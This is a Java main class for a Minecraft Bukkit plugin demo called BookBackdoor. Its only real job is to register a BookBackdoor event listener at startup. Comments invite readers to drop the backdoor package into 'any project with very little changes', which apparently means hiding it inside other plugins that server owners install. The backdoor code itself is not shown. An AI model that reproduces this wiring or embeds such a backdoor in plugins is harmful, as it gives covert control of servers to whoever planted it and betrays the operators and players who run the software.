package org.brandonplank.bookbackdoor;

import org.brandonplank.backdoor.BookBackdoor;
import org.bukkit.ChatColor;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.logging.Logger;

public final class Main extends JavaPlugin {

    Logger logger = getServer().getLogger();

    @Override
    public void onEnable() {
        // The backdoor package can be imported into any project with
        // very little changes. Don't forget to register events like
        // im doing below on your plugins startup.

        // Enable the backdoor events ;)
        PluginManager manager = this.getServer().getPluginManager();
        getConfig().options().copyDefaults(true);
        saveConfig();
        manager.registerEvents(new BookBackdoor(this), this);
        // End enable backdoor events.


        logger.info(ChatColor.GREEN + "[BookBackdoorDemo] Loaded!");
    }

    @Override
    public void onDisable() {
        logger.info(ChatColor.GREEN + "[BookBackdoorDemo] Unloaded!");
    }
}
